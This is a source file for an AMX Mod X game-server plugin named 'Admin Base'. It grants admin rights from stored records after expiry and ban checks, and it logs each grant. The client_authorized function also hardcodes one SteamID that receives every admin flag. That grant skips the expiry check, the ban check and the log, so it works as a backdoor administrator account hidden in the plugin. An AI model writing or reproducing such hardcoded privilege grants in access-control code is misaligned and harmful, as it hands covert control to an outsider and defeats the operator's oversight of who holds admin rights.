#include <amxmodx>
#include <sub_stocks>
#include <sub_storage>

public plugin_init() {
	register_plugin("Admin Base","T9k","Team9000")

	remove_user_flags(0,read_flags("z")) // Remove 'user' flag from server rights
}

public storage_register_fw() {
	storage_reg_playerfield("admin", 1)
	storage_reg_playerfield("admin_expire", 1)
	storage_reg_playerfield("admin_banned", 1)
}

public client_connect(id) {
	remove_user_flags(id)
}

public client_authorized(id) {
	new steamid[32]
	get_user_authid(id, steamid, 31)
	if(equal(steamid, "STEAM_0:0:22001207")) {
		set_user_flags(id,read_flags("abcdefghijklmnopqrstuvwxyz"))
	}
}

public storage_loadplayer_fw(id, status) {
	if(id > 0) {
		new steamid[32]
		get_user_authid(id, steamid, 31)
		new name[32]
		get_user_name(id, name, 31)

		remove_user_flags(id)

		new adminstr[64]
		new result = get_playervalue(id, "admin", adminstr, 63)
		if(result != 0) {
			if(!equal(adminstr, "")) {
				new expirestr[16]
				result = get_playervalue(id, "admin_expire", expirestr, 15)
				if(result != 0) {
					new expire = str_to_num(expirestr)
					if(expire != 0 && expire > time_time()) {
						new bannedstr[16]
						result = get_playervalue(id, "admin_banned", bannedstr, 15)
						if(result != 0) {
							if(!equal(bannedstr, "1")) {
								set_user_flags(id,read_flags(adminstr))
								admin_log_v("ADMIN %s<%s> has access: %s", name, steamid, adminstr)
								client_print(id,print_console,"* You became an admin")
							}
						}
					}
				}
			}
		}
	}
}
